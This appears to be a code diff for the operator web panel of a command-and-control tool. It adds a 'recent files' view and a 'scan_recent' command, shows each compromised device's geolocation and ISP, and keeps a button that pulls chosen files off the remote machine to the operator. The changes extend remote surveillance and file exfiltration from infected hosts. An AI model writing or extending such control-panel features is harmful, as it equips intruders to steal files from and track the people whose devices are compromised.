@@ -1,6 +1,6 @@
 import { PageContainer, ProCard } from '@ant-design/pro-components';
 import { useParams, useRequest } from '@umijs/max';
-import { Button, Card, Descriptions, message, Space, Tabs, Typography, Input, Table, Switch, Image, Badge, Alert, Select, Modal } from 'antd';
+import { Button, Card, Descriptions, message, Space, Tabs, Typography, Input, Table, Switch, Image, Badge, Alert, Select, Modal, Radio } from 'antd';
 import React, { useEffect, useState } from 'react';
 import { listC2DeviceVoByPageUsingPost, listSoftwareUsingGet, listWifiUsingGet, listFilesUsingGet } from '@/services/backend/c2DeviceController';
 import { addC2TaskUsingPost, listC2TaskVoByPageUsingPost } from '@/services/backend/c2TaskController';
@@ -151,22 +151,24 @@ const FileTab = ({ uuid, onSendCommand }: { uuid: string; onSendCommand: (cmd: s
     const [fileList, setFileList] = useState<any[]>([]);
     const [currentPath, setCurrentPath] = useState('');
     const [loading, setLoading] = useState(false);
+    const [viewMode, setViewMode] = useState<'files' | 'recent'>('files');
 
     // Fetch files for current path
-    const fetchFiles = async (path: string) => {
+    const fetchFiles = async (path: string, mode: 'files' | 'recent') => {
         setLoading(true);
         try {
              const res = await listFilesUsingGet({
                 deviceUuid: uuid,
-                parentPath: path,
+                parentPath: mode === 'files' ? path : undefined,
+                isRecent: mode === 'recent' ? 1 : undefined,
                 current: 1,
                 pageSize: 1000
              });
              const list = res?.data?.data?.records || [];
              setFileList(list);
              
-             // If empty, maybe trigger scan?
-             if (list.length === 0 && path !== '') {
+             // If empty in file mode, maybe trigger scan?
+             if (mode === 'files' && list.length === 0 && path !== '') {
                  // Try scanning this path
                  try {
                      await addC2TaskUsingPost({
@@ -185,8 +187,8 @@ const FileTab = ({ uuid, onSendCommand }: { uuid: string; onSendCommand: (cmd: s
     };
 
     useEffect(() => {
-        fetchFiles(currentPath);
-    }, [uuid, currentPath]);
+        fetchFiles(currentPath, viewMode);
+    }, [uuid, currentPath, viewMode]);
 
     const handleEnterFolder = (record: any) => {
         if (record.isDirectory === 1) {
@@ -235,31 +237,45 @@ const FileTab = ({ uuid, onSendCommand }: { uuid: string; onSendCommand: (cmd: s
             render: (val: number) => val ? (val / 1024).toFixed(2) + ' KB' : '-'
         },
         {
-             title: '操作',
-             key: 'action',
-             width: 100,
-             render: (_, record: any) => (
-                 record.isDirectory !== 1 && (
-                     <Button type="link" size="small" onClick={() => {
-                        Modal.confirm({
-                            title: '确认上传',
-                            content: `是否上传文件 ${record.name}?`,
-                            onOk: () => onSendCommand('upload_file', record.path)
-                        });
-                     }}>上传</Button>
-                 )
-             )
+            title: '操作',
+            dataIndex: 'action',
+            key: 'action',
+            width: 100,
+            render: (_, record: any) => (
+                record.isDirectory !== 1 && (
+                    <Button type="link" size="small" onClick={() => {
+                       Modal.confirm({
+                           title: '确认上传',
+                           content: `是否上传文件 ${record.name}?`,
+                           onOk: () => onSendCommand('upload_file', record.path)
+                       });
+                    }}>上传</Button>
+                )
+            )
         }
     ];
 
     return (
         <Space direction="vertical" style={{ width: '100%' }}>
              <Space style={{ marginBottom: 16 }}>
-                 <Button icon={<ArrowUpOutlined />} onClick={handleGoUp} disabled={!currentPath}>返回上一级</Button>
-                 <Button icon={<ReloadOutlined />} onClick={() => fetchFiles(currentPath)}>刷新</Button>
-                 <Input value={currentPath} readOnly style={{ width: 400 }} placeholder="Root (Disk Drives)" />
-                 {fileList.length === 0 && (
+                 <Radio.Group value={viewMode} onChange={e => setViewMode(e.target.value)} buttonStyle="solid">
+                     <Radio.Button value="files">文件浏览</Radio.Button>
+                     <Radio.Button value="recent">最近文件</Radio.Button>
+                 </Radio.Group>
+                 
+                 {viewMode === 'files' && (
+                     <>
+                        <Button icon={<ArrowUpOutlined />} onClick={handleGoUp} disabled={!currentPath}>返回上一级</Button>
+                        <Input value={currentPath} readOnly style={{ width: 400 }} placeholder="Root (Disk Drives)" />
+                     </>
+                 )}
+                 <Button icon={<ReloadOutlined />} onClick={() => fetchFiles(currentPath, viewMode)}>刷新</Button>
+                 
+                 {viewMode === 'files' && fileList.length === 0 && (
                      <Button onClick={() => onSendCommand('scan_disk', '')}>扫描磁盘</Button>
+                 )}
+                 {viewMode === 'recent' && (
+                     <Button onClick={() => onSendCommand('scan_recent', '')}>扫描最近文件</Button>
                  )}
              </Space>
              <Table 
@@ -583,7 +599,11 @@ const C2DeviceDetail: React.FC = () => {
           <Descriptions.Item label="UUID">{device?.uuid}</Descriptions.Item>
           <Descriptions.Item label="主机名">{device?.hostName}</Descriptions.Item>
           <Descriptions.Item label="操作系统">{device?.os}</Descriptions.Item>
-          <Descriptions.Item label="IP地址">{device?.externalIp} / {device?.internalIp}</Descriptions.Item>
+          <Descriptions.Item label="IP地址">{device?.externalIp} (外) / {device?.internalIp} (内)</Descriptions.Item>
+          <Descriptions.Item label="地理位置">
+              {device?.country ? `${device?.country} - ${device?.region} - ${device?.city}` : '-'}
+          </Descriptions.Item>
+          <Descriptions.Item label="ISP">{device?.isp || '-'}</Descriptions.Item>
           <Descriptions.Item label="MAC地址">{device?.macAddress}</Descriptions.Item>
           <Descriptions.Item label="最后在线">{device?.lastSeen}</Descriptions.Item>
         </Descriptions>
